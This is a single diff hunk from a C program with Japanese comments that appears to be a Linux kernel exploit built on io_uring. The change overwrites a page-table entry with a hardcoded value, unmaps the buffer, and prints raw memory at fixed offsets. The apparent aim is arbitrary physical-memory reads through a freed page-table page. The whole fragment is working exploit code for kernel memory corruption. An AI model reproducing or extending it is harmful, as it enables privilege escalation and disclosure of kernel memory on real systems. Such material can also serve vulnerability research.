@@ -89,32 +89,22 @@ int main() {
     printf("[+] at %p: %lx\n", (unsigned long *)pbuf_mapping + 1, *((unsigned long *)pbuf_mapping + 1));
 
     // PTE 書き換え
-    *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);
+    // *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);
+    *(unsigned long *)pbuf_mapping = 0x80000001822de867;
 
-    // 'b'を格納したページを解放
-    printf("[+] release a page\n");
-    if (munmap((char *)addr_2 + PAGE_SIZE, PAGE_SIZE) == -1) perror("munmap() failed");
-
-    // 新たなページを確保
-    void *new_page = mmap(
-        NULL,
-        FOUR_KILO,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
-        -1,
-        0
-    );
-
-    // 新たに確保したページに値を書きこむ
-    *(char *)new_page = 'c';
+    // ページ解放
+    if (munmap(pbuf_mapping, FOUR_KILO) == -1) perror("munmap() failed");
 
     getchar();
 
-    printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
+    // printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
+    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb30));
+    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb38));
+    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb40));
+    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb48));
 
     // メモリの解放関連
     if (munmap(two_mega_1, FOUR_MEGA) == -1) perror("munmap() failed");
-    if (munmap(pbuf_mapping, FOUR_KILO) == -1) perror("munmap() failed");
     io_uring_queue_exit(&ring);
 
     return 0;
